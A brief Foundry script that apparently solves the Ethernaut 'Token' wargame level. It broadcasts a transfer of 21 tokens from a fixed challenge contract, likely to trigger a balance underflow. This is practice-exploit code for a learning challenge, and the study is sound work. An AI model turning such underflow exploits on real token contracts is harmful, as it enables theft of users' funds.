// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../../src/Ethernaut/token.sol";

contract TokenAttackScript is Script {
    Token public token = Token(0x471636e727902408E8b0826D4194873C9a9650ce);
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        token.transfer(0xbd6AfFe91e36a4b9d4aa07F130A973B9282cA225, 21);
        vm.stopBroadcast();
    }
}
